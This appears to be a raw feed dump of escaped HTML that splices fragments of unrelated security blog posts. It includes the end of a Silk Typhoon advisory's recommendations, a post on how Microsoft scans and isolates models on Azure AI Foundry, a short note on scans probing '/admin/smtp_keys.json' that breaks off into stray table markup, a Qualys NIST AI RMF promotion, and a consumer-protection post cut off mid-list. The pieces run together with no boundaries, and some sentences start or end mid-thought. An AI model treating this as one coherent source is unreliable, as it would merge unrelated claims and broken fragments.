&lt;p&gt;Microsoft Sentinel customers can use the following queries to detect behavior associated with Silk Typhoon:&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="recommendations"&gt;Recommendations&lt;/h2&gt;



&lt;p&gt;To help detect and mitigate Silk Typhoon’s activity, Microsoft recommends the following:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Ensure all public facing devices are patched. It&amp;#8217;s important to note that patching a vulnerable device does not remediate any post-compromise activities by a threat actor who gained privileged access to a vulnerable device.&lt;/li&gt;



&lt;li&gt;Validate any Ivanti Pulse Connect VPN are patched to address &lt;a href="https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Connect-Secure-Policy-Secure-ZTA-Gateways-CVE-2025-0282-CVE-2025-0283"&gt;CVE-2025-0282&lt;/a&gt; and run the suggested Integrity Checker Tool as suggested in their Advisory. Consider terminating any active or persistent sessions following patch cycles.&lt;/li&gt;



&lt;li&gt;Defend against legitimate application and service principal abuse by establishing strong controls and monitoring for these security identities. Microsoft recommends the following mitigations to reduce the impact of this threat:&lt;ul&gt;&lt;li&gt;Audit the current privilege level of all identities, users, service principals, and Microsoft Graph Data Connect applications (use the Microsoft Graph Data Connect authorization portal) to understand which identities are highly privileged. Scrutinize privileges more closely if they belong to an unknown identity, belong to identities that are no longer in use, or are not fit for purpose. Admins may assign identities privileges over and above what is required. Defenders should pay attention to apps with app-only permissions as those apps might have over-privileged access. Read additional guidance for investigating compromised and malicious applications.Identify abused OAuth apps using anomaly detection policies. Detect abused OAuth apps that make sensitive Exchange Online administrative activities through Microsoft Defender for Cloud Apps. Investigate and remediate any risky OAuth apps.Review any applications that hold &lt;em&gt;EWS.AccessAsUser.All&lt;/em&gt; and &lt;em&gt;EWS.full_access_as_app&lt;/em&gt; permissions and understand whether they are still required in the tenant. This can be done using App governance in Microsoft Defender for Cloud Apps. If these permissions are no longer required, they should be removed.&lt;/li&gt;&lt;/ul&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;If applications must access mailboxes, granular and scalable access can be implemented using role-based access control for applications in Exchange Online. This access model ensures applications are only granted to the specific mailboxes required.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;Monitor for service principal sign-ins from unusual locations. Two important reports can provide useful daily activity monitoring:
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The &lt;a href="https://learn.microsoft.com/entra/id-protection/howto-identity-protection-investigate-risk#risky-sign-ins-report" rel="noreferrer noopener" target="_blank"&gt;risky sign-ins report&lt;/a&gt;&lt;span style="font-size: 1.25rem;"&gt;&amp;nbsp;surfaces attempted and successful user access activities where the legitimate owner might not have performed the sign-in.&amp;nbsp;&lt;/span&gt;&lt;/li&gt;



&lt;li&gt;The &lt;a href="https://learn.microsoft.com/entra/id-protection/howto-identity-protection-investigate-risk#risky-users-report" rel="noreferrer noopener" target="_blank"&gt;risky users report&lt;/a&gt;&amp;nbsp;surfaces user accounts that might have been compromised, such as a leaked credential that was detected or the user signing in from an unexpected location in the absence of planned travel.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;Defend against credential compromise by building credential hygiene, practicing the principle of least privilege, and reducing credential exposure. Microsoft recommends the following mitigations to reduce the impact of this threat.&lt;/li&gt;



&lt;li&gt;Implement the Azure Security Benchmark and general best practices for securing identity infrastructure, including:&lt;ul&gt;&lt;li&gt;Prevent on-premises service accounts from having direct rights to the cloud resources to prevent lateral movement to the cloud.&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;Ensure that “break glass” account passwords are stored offline and configure honey-token activity for account usage.&lt;/li&gt;&lt;/ul&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Implement Conditional Access policies enforcing Microsoft’s Zero Trust principles.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;Enable risk-based user sign-in protection and automate threat response to block high-risk sign-ins from all locations and enable multifactor authentication (MFA) for medium-risk ones.&lt;/li&gt;



&lt;li&gt;Ensure that VPN access is protected using modern authentication methods.&lt;/li&gt;



&lt;li&gt;Identify all multi-tenant applications, assess permissions, and investigate suspicious sign-ins.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="indicators-of-compromise"&gt;Indicators of compromise&lt;/h2&gt;



&lt;p&gt;Silk Typhoon is not known to use their own dedicated infrastructure in their operations. Typically, the threat actor uses compromised covert networks, proxies, and VPNs for infrastructure, likely to obfuscate their operations. However, they have also been observed using short-lease virtual private server (VPS) infrastructure to support their operations.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="microsoft-defender-xdr-detections"&gt;Microsoft Defender XDR detections&lt;/h2&gt;



&lt;p&gt;Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.&lt;/p&gt;



&lt;p&gt;Customers with provisioned access can also use &lt;a href="https://learn.microsoft.com/defender-xdr/security-copilot-in-microsoft-365-defender"&gt;Microsoft Security Copilot in Microsoft Defender&lt;/a&gt; to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/03/04/securing-generative-ai-models-on-azure-ai-foundry/"&gt;Securing generative AI models on Azure AI Foundry&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;New generative AI models with a broad range of capabilities are emerging every week. In this world of rapid innovation, when choosing the models to integrate into your AI system, it is crucial to make a thoughtful risk assessment that ensures a balance between leveraging new advancements and maintaining robust security. At Microsoft, we are focusing on making our AI development platform a secure and trustworthy place where you can explore and innovate with confidence.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Here we’ll talk about one key part of that: how we secure the models and the runtime environment itself. How do we protect against a bad model compromising your AI system, your larger cloud estate, or even Microsoft’s own infrastructure?&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="how-microsoft-protects-data-and-software-in-ai-systems"&gt;How Microsoft protects data and software in AI systems&lt;/h2&gt;



&lt;p&gt;But before we set off on that, let me set to rest one very common misconception about how data is used in AI systems. Microsoft does &lt;em&gt;not&lt;/em&gt; use customer data to train shared models, nor does it share your logs or content with model providers. Our AI products and platforms are part of our standard product offerings, subject to the same terms and trust boundaries you’ve come to expect from Microsoft, and your model inputs and outputs are considered customer content and handled with the same protection as your documents and email messages. Our AI platform offerings (&lt;a href="https://azure.microsoft.com/products/ai-foundry" rel="noreferrer noopener" target="_blank"&gt;Azure AI Foundry&lt;/a&gt; and &lt;a href="https://azure.microsoft.com/products/ai-services/openai-service" rel="noreferrer noopener" target="_blank"&gt;Azure OpenAI Service&lt;/a&gt;) are 100% hosted by Microsoft on its own servers, with no runtime connections to the model providers. We do offer some features, such as model fine-tuning, that allow you to use your data to create better models for your own use—but these are &lt;em&gt;your&lt;/em&gt; models that stay in your tenant.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;So, turning to model security: the first thing to remember is that models are just software, running in &lt;a href="https://azure.microsoft.com/products/virtual-machines" rel="noreferrer noopener" target="_blank"&gt;Azure Virtual Machines&lt;/a&gt; (VM) and accessed through an API; they don’t have any magic powers to break out of that VM, any more than any other software you might run in a VM. Azure is already quite defended against software running in a VM attempting to attack Microsoft’s infrastructure—bad actors try to do that every day, not needing AI for it, and AI Foundry inherits all of those protections. This is a “zero-trust” architecture: Azure services do not assume that things running on Azure are safe!&amp;nbsp;&lt;/p&gt;


&lt;div class="wp-block-msxcm-kicker-container"&gt;
	&lt;div class=" wp-block-msxcm-kicker-block wp-block-msxcm-kicker--align-left"&gt;
		&lt;p class="wp-block-msxcm-kicker__title small text-neutral-400 text-uppercase"&gt;
			What is Zero Trust?		&lt;/p&gt;
		&lt;a class="wp-block-msxcm-kicker__cta btn btn-link p-0 text-decoration-none" href="https://www.microsoft.com/security/business/zero-trust" target="_blank"&gt;
			&lt;span&gt;Learn more&lt;/span&gt; &lt;span class="glyph-append glyph-append-xsmall wp-block-msxcm-kicker__glyph glyph-append-go"&gt;&lt;/span&gt;
		&lt;/a&gt;
	&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Now, it &lt;em&gt;is&lt;/em&gt; possible to conceal malware inside an AI model. This could pose a danger to you in the same way that malware in any other open- or closed-source software might. To mitigate this risk, for our highest-visibility models we scan and test them before release:&amp;nbsp;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Malware analysis&lt;/strong&gt;: Scans AI models for embedded malicious code that could serve as an infection vector and launchpad for malware.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Vulnerability assessment&lt;/strong&gt;: Scans for common vulnerabilities and exposures (CVEs) and zero-day vulnerabilities targeting AI models.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Backdoor detection&lt;/strong&gt;: Scans model functionality for evidence of supply chain attacks and backdoors such as arbitrary code execution and network calls.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Model integrity&lt;/strong&gt;: Analyzes an AI model’s layers, components, and tensors to detect tampering or corruption.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;You can identify which models have been scanned by the indication on their model card—no customer action is required to get this benefit. For especially high-visibility models like &lt;a href="https://ai.azure.com/explore/models/DeepSeek-R1/version/1/registry/azureml-deepseek" rel="noreferrer noopener" target="_blank"&gt;DeepSeek R1&lt;/a&gt;, we go even further and have teams of experts tear apart the software—examining its source code, having red teams probe the system adversarially, and so on—to search for any potential issues before releasing the model. This higher level of scanning doesn’t (yet) have an explicit indicator in the model card, but given its public visibility we wanted to get the scanning done before we had the UI elements ready.&amp;nbsp;&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="defending-and-governing-ai-models"&gt;Defending and governing AI models&lt;/h2&gt;



&lt;p&gt;Of course, as security professionals you presumably realize that no scans can detect all malicious action. This is the same problem an organization faces with any other third-party software, and organizations should address it in the usual manner: trust in that software should come in part from trusted intermediaries like Microsoft, but above all should be rooted in an organization’s own trust (or lack thereof) for its provider.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;For those wanting a more secure experience, once you’ve chosen and deployed a model, you can use the full suite of Microsoft’s security products to defend and govern it. You can read more about how to do that here: &lt;a href="https://www.microsoft.com/security/blog/2025/02/13/securing-deepseek-and-other-ai-systems-with-microsoft-security" rel="noreferrer noopener" target="_blank"&gt;Securing DeepSeek and other AI systems with Microsoft Security&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;And of course, as the quality and behavior of each model is different, you should evaluate any model not just for security, but for whether it fits your specific use case, by testing it as part of your complete system. This is part of the wider approach to how to secure AI systems which we’ll come back to, in depth, in an upcoming blog.&amp;nbsp;&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="using-microsoft-security-to-secure-ai-models-and-customer-data"&gt;Using Microsoft Security to secure AI models and customer data&lt;/h2&gt;



&lt;p&gt;In summary, the key points of our approach to securing models on &lt;a href="https://azure.microsoft.com/products/ai-foundry" rel="noreferrer noopener" target="_blank"&gt;Azure AI Foundry&lt;/a&gt; are:&amp;nbsp;&lt;/p&gt;



&lt;ol class="wp-block-list" start="1"&gt;
&lt;li&gt;Microsoft carries out a variety of security investigations for key AI models before hosting them in the &lt;a href="https://azure.microsoft.com/products/ai-model-catalog"&gt;Azure AI Foundry Model Catalogue&lt;/a&gt;, and continues to monitor for changes that may impact the trustworthiness of each model for our customers. You can use the information on the model card, as well as your trust (or lack thereof) in any given model builder, to assess your position towards any model the way you would for any third-party software library.&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="2"&gt;
&lt;li&gt;All models hosted on Azure are isolated within the customer tenant boundary. There is no access to or from the model provider, including close partners like OpenAI.&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="3"&gt;
&lt;li&gt;Customer data &lt;a href="https://learn.microsoft.com/legal/cognitive-services/openai/data-privacy" rel="noreferrer noopener" target="_blank"&gt;is not used to train models&lt;/a&gt;, nor is it made available outside of the Azure tenant (unless the customer designs their system to do so).&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Yesterday, I noted a couple of requests that stuck out a bit:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;/admin/smtp_keys.json&lt;br /&gt;

	&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The requests originate from one IP address, %%ip:193.41.206.202%%. According to Whois, the IP is associated with a Romanian Distillery (Alexandrion Saber 1789 Distilleries). Likely a compromised system in their network used for scanning. The scans started in February and they have been hitting possible secrets files since then ever so often slightly changing the set of files they are looking for.&lt;/p&gt;

But while these technologies present incredible opportunities for innovation, they also pose unique risks. AI systems are no longer just futuristic concepts; they are actively influencing business decisions, customer interactions, and even regulatory landscapes. As AI capabilities grow, so does the need for robust risk management frameworks to ensure AI remains trustworthy, secure, and ethical.&lt;/p&gt;



&lt;p&gt;The &lt;strong&gt;&lt;a href="https://airc.nist.gov/airmf-resources/airmf/"&gt;National Institute of Standards and Technology (NIST) AI Risk Management Framework (AI RMF 1.0)&lt;/a&gt;&lt;/strong&gt;, released in January 2023, provides organizations with a structured approach to mitigating AI risks, ensuring that their AI deployments align with best practices and regulatory expectations.&lt;/p&gt;



&lt;p&gt;However, translating frameworks into action can be a real challenge. That’s where &lt;strong&gt;Qualys Policy Compliance&lt;/strong&gt; steps in, offering a powerful solution for businesses aiming to align their operations with the NIST AI RMF. By automating policy adherence and providing real-time visibility into risks, Qualys helps organizations seamlessly integrate AI risk management principles into their operations. &amp;nbsp;&lt;/p&gt;



&lt;p&gt;This blog highlights how Qualys Policy Compliance supports the adoption of NIST AI RMF to strengthen AI accountability and governance.&lt;/p&gt;



&lt;span id="more-37252"&gt;&lt;/span&gt;



&lt;h2 class="wp-block-heading" id="what-is-nist-ai-rmf-1-0"&gt;&lt;strong&gt;What is NIST AI RMF 1.0?&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;NIST AI RMF 1.0 essentially offers you an AI Risk Management playbook through a voluntary framework designed to help organizations manage risks associated with AI systems.&lt;/p&gt;



&lt;p&gt;Picture this: Your organization is deploying AI-driven automation to optimize decision-making, but regulators, customers, and internal stakeholders want assurances that your AI is trustworthy and compliant. Simply trusting that AI will behave as intended is no longer an option. That’s why the NIST AI RMF 1.0 exists—providing organizations with a strategic framework to balance innovation with responsibility.&lt;/p&gt;



&lt;p&gt;At its core, NIST AI RMF focuses on creating &lt;strong&gt;trustworthy AI&lt;/strong&gt; through four core functions:&amp;nbsp;&lt;/p&gt;



&lt;ol class="wp-block-list" start="1"&gt;
&lt;li&gt;&lt;strong&gt;Map&lt;/strong&gt;: Identifying AI risks within specific operational contexts&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Measure&lt;/strong&gt;: Evaluating and assessing the nature and magnitude of risks&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Manage&lt;/strong&gt;: Implementing risk mitigation strategies&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Govern&lt;/strong&gt;: Establishing policies, practices, and accountability mechanisms&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;By following the principles laid out in the framework, organizations can ensure that AI systems are not only efficient but also ethical, secure, and aligned with business goals and regulatory requirements. However, many businesses struggle with the practical implementation of these guidelines, which is where Qualys comes in.&amp;nbsp;&lt;/p&gt;



&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;



&lt;p class="has-text-align-center"&gt;&lt;strong&gt;See how Qualys Policy Compliance can help with NIST AI RMF adoption in your organization.&lt;/strong&gt;&lt;/p&gt;



&lt;div class="wp-block-button is-style-fill" style="margin: 0 auto 1em; text-align: center;"&gt;&lt;a class="wp-block-button__link has-white-color has-text-color has-background" href="https://www.qualys.com/forms/policy-compliance/" style="background-color: #ed2e26;"&gt;Request a Demo&lt;/a&gt;&lt;/div&gt;



&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;



&lt;h2 class="wp-block-heading" id="challenges-in-nist-ai-rmf-adoption"&gt;&lt;strong&gt;Challenges in NIST AI RMF Adoption&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;The framework provides an excellent blueprint, but execution remains a challenge even for seasoned security leaders. Organizations striving for NIST AI RMF compliance often encounter several roadblocks:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;A Complex Compliance Landscape&lt;/strong&gt;: Balancing NIST AI RMF requirements with other global standards like GDPR, CCPA, and ISO 27001 can be daunting.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;AI Governance Gaps:&lt;/strong&gt; Defining ownership and accountability for AI decisions is easier said than done. Establishing accountability for AI decisions requires robust policy enforcement and documentation.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Limited Risk Visibility:&lt;/strong&gt; Without robust tools, identifying and quantifying AI risks across complex systems is merely a guessing game.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;The Need for Continuous Monitoring:&lt;/strong&gt; AI risk isn’t static; it evolves. That&amp;#8217;s precisely why organizations need to think in terms of a continuous AI risk management process with ongoing assessment and updates.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Successfully overcoming these obstacles requires automation, real-time monitoring, and centralized policy enforcement—all of which Qualys Policy Compliance delivers, simplifying your journey to NIST AI RMF adoption.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="how-qualys-policy-compliance-bridges-the-gap"&gt;&lt;strong&gt;How Qualys Policy Compliance Bridges the Gap&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Qualys Policy Compliance is a cloud-based solution designed to automate and streamline policy management across hybrid environments and acts as your AI risk management command center. With real-time performance metrics, prebuilt policy templates, and proactive risk mitigation, organizations can streamline AI governance without adding operational burdens. &lt;/p&gt;



&lt;p&gt;Here’s how it aligns with the four functions of the NIST AI RMF:&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;1. Mapping AI Risks Across Environments&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Your AI risk landscape is an ever-evolving web of data flows, dependencies, and evolving behaviors. Organizations need a &lt;strong&gt;comprehensive view&lt;/strong&gt; of where AI is used, how it behaves, and what risks it introduces. Qualys Policy Compliance enables organizations to map risks effectively by:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Identifying potential vulnerabilities and non-compliance areas through AI-driven processes.&lt;/li&gt;



&lt;li&gt;Providing visibility into data flows, dependencies, and AI model behaviors that might introduce risks.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Ensuring a complete understanding of AI risk contexts by aligning mapping with regulatory mandates.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;2. Measuring AI Risks in Real Time&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;AAI risk measurement shouldn’t rely on guesswork; it needs quantifiable data and actionable insights. To support the &amp;#8220;Measure&amp;#8221; function, Qualys offers tools to evaluate compliance gaps and quantify risks effectively by enabling:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Automated Scanning&lt;/strong&gt;: Continuous monitoring of AI systems and IT assets for deviations from compliance policies.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Scorecards and Dashboards&lt;/strong&gt;: Real-time metrics to measure the performance and reliability of AI systems.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Risk Prioritization&lt;/strong&gt;: Actionable intelligence to identify high-risk areas, effectively focusing mitigation efforts where they matter most.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;3. Managing Risks with Automation&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;For AI risk management, simply identifying risks isn’t enough. Organizations must gain the ability to act swiftly to mitigate potential threats. Qualys simplifies the risk management process with automation and proactive controls through:&amp;nbsp;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Policy Templates&lt;/strong&gt;: Offers predefined and customizable templates aligned with NIST AI RMF to help enforce governance.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Remediation Guidance&lt;/strong&gt;: Provides actionable insights for addressing non-compliance issues, reducing AI-related risks.&amp;nbsp;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Continuous Updates&lt;/strong&gt;: Ensures compliance with evolving standards and AI policies through automatic updates.&lt;/li&gt;
&lt;/ul&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;strong&gt;4. Governing AI with Confidence&lt;/strong&gt;&lt;/h3&gt;



&lt;p&gt;Strong AI governance is the backbone of responsible AI. To ensure that AI compliance isn’t just an occasional check-in but an ongoing commitment to trustworthiness, Qualys helps organizations build robust governance structures with the following:&amp;nbsp;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Audit Trails&lt;/strong&gt;: Maintains a complete log of compliance activities, ensuring transparency and accountability.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Documentation and Reporting&lt;/strong&gt;: Provides detailed reports that demonstrate adherence to NIST AI RMF principles and other frameworks.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Policy Enforcement&lt;/strong&gt;: Establishes clear accountability for AI risk management across teams and processes.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The NIST AI RMF is added within the mandates section, listing out each requirement mapped to Qualys controls for automated reporting:&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/AI-RMF-Image-1.png"&gt;&lt;img alt="" class="wp-image-37253" height="803" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/02/AI-RMF-Image-1.png" width="965" /&gt;&lt;/a&gt;&lt;/figure&gt;

Each year, the first week of March (March 2-8) is recognized as National Consumer Protection Week (NCPW). During this time, many government agencies and consumer protection organizations come together to help educate consumers on how to keep their personal and financial information secure.&lt;/p&gt;



&lt;p&gt;The event is sponsored by the &lt;a href="https://www.ftc.gov/" rel="noreferrer noopener" target="_blank"&gt;Federal Trade Commission&lt;/a&gt; (FTC), and other participating agencies include the &lt;a href="https://www.fdic.gov/consumer-resource-center/national-consumer-protection-week" rel="noreferrer noopener" target="_blank"&gt;Federal Deposit Insurance Corporation&lt;/a&gt; (FDIC), &lt;a href="https://states.aarp.org/maryland/national-consumer-protect-protection-tips" rel="noreferrer noopener" target="_blank"&gt;AARP&lt;/a&gt;,&amp;nbsp;and the&lt;a href="https://www.bbb.org/all/national-consumer-protection-week-partnership" rel="noreferrer noopener" target="_blank"&gt; Better Business Bureau&lt;/a&gt; (BBB). This month, take advantage of all that NCPW offers, including access to free tools and information that can help you identify and prevent online scams, fraud, and identity theft.&lt;/p&gt;



&lt;h2&gt;The growing risks to your data&lt;/h2&gt;



&lt;ul&gt;
&lt;li&gt;During the third quarter of 2024, data breaches exposed more than &lt;a href="https://www.statista.com/statistics/1307426/number-of-data-breaches-worldwide/" rel="noreferrer noopener" target="_blank"&gt;422 million records worldwide.&lt;/a&gt; Millions of customers were put at risk when their social security numbers, phone numbers, and other sensitive personal information were leaked.&lt;/li&gt;



&lt;li&gt;As of 2024, the average cost of a data breach in the United States amounted to &lt;a href="https://www.statista.com/statistics/273575/us-average-cost-incurred-by-a-data-breach/" rel="noreferrer noopener" target="_blank"&gt;$9.36 million. &lt;/a&gt;In comparison, the&amp;nbsp;&lt;a href="https://www.statista.com/statistics/987474/global-average-cost-data-breach/" rel="noreferrer noopener" target="_blank"&gt;global average cost per data breach&lt;/a&gt;&amp;nbsp;was $4.88 million.&lt;/li&gt;



&lt;li&gt;The&amp;nbsp;&lt;a href="https://www.statista.com/statistics/1387393/loss-sensitive-information-organizations-cause-worldwide/" rel="noreferrer noopener" target="_blank"&gt;most common causes&lt;/a&gt;&amp;nbsp;of leaks were operating system (OS) flaws and weaknesses on devices like computers and phones. For example, when a user forgets to log out before they leave their computer, it can open the door for cybercriminals to steal information. In fact, it’s estimated that careless users are responsible for about 70% of sensitive data loss.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;Common attacks to consumer protection&lt;/h2&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Identity theft and fraud&lt;/strong&gt;&lt;br /&gt;Some common types of identity theft and fraud include &lt;a href="https://www.experian.com/blogs/ask-experian/20-types-of-identity-theft-and-fraud/#a1" rel="noreferrer noopener" target="_blank"&gt;account takeover fraud&lt;/a&gt;, when criminals use stolen personal information such as account numbers, usernames, or passwords to hijack bank accounts, credit cards, and even email and social media accounts.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Online shopping scams&lt;/strong&gt;&lt;br /&gt;An &lt;a href="https://www.wellsfargo.com/privacy-security/fraud/bank-scams/online-shopping-scams/" rel="noreferrer noopener" target="_blank"&gt;online shopping scam&lt;/a&gt; usually involves a fake online store or app, which appears legitimate and is promoted on social media or other authentic websites.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Financial fraud&lt;/strong&gt;&lt;br /&gt;With the advent of artificial intelligence (AI), financial fraud tactics are growing more sophisticated, and sadly, they often target older people. For example, &lt;a href="https://www.fcc.gov/grandparent-scams-get-more-sophisticated" rel="noreferrer noopener" target="_blank"&gt;grandparent scams&lt;/a&gt; happen when someone who sounds like a grandchild or other relative contacts an older person and asks them to send money via wire transfer to help get them out of trouble. Scammers use AI to clone voices, which helps them convince you that you’re sending money to a family member who desperately needs your help.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Medical identity theft&lt;/strong&gt;&lt;br /&gt;&lt;a href="https://www.equifax.com/personal/education/identity-theft/articles/-/learn/medical-identity-theft/" rel="noreferrer noopener" target="_blank"&gt;Medical identity theft&lt;/a&gt; happens when someone steals or uses your personal information like your name, Social Security number, or Medicare details, to get healthcare in your name. This kind of fraud can disrupt your medical care and cost a lot of money to resolve.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Social engineering attacks&lt;/strong&gt;&lt;br /&gt;&lt;a href="https://www.webroot.com/us/en/resources/tips-articles/what-is-social-engineering"&gt;Social engineering attacks&lt;/a&gt; occur when someone uses a fake persona to gain your trust. They deceive you into divulging confidential information so they can steal your money. Contact is usually made through social media, by phone or in person.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;How to protect yourself and your data&lt;/h2&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Smart ways to secure your devices&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Strong passwords &amp;#8211; Make them long, random, and unique.&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.webroot.com/us/en/home"&gt;Password managers&lt;/a&gt; – Automatically generate and store strong passwords.&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.webroot.com/us/en/home/products/essentials"&gt;Antivirus protection&lt;/a&gt; – Software&amp;nbsp;that protects against viruses and malware.&lt;/li&gt;

&lt;li&gt;Protect your identity &amp;#8211; &lt;a href="https://www.webroot.com/us/en/home/products/premium?srsltid=AfmBOoryhcUGDqErsI6sehKwtM1zjwEBbek6_QfRZ8afGvlVXxJtl0AF"&gt;Webroot Premium&lt;/a&gt; provides identity protection for up to 10 identities, including financial account and credit monitoring, and dark web monitoring.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Beware before you share&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Phishing scams – Avoid clicking on malicious links in emails and social media.&lt;/li&gt;



&lt;li&gt;Unsolicited calls or emails – Be wary about sharing personal details&amp;nbsp;with people you do not know.&lt;/li&gt;



&lt;li&gt;Make sure businesses and organizations are legitimate – Confirm you’re dealing with a trusted source.&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.webroot.com/us/en/home/products/av"&gt;Webroot Essentials&lt;/a&gt; and &lt;a href="https://www.webroot.com/us/en/home/products/premium?srsltid=AfmBOorr0PyzRegxMrUV8TDWiJQjjEcQ5jr1grz8tx-vkZ-_VZcfVdzP"&gt;Webroot Premium&lt;/a&gt; – Offer peace of mind with device, identity, and privacy protection.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Practice personal Information management&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;Data minimization strategies – Provide the least number of private details necessary when filling out forms or answering questionnaires&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;.&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/li&gt;



&lt;li&gt;Social media privacy – Avoid sharing personal information on social media.&lt;/li&gt;

&lt;p&gt;&lt;strong&gt;TOP ATTACKS AND BREACHES&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
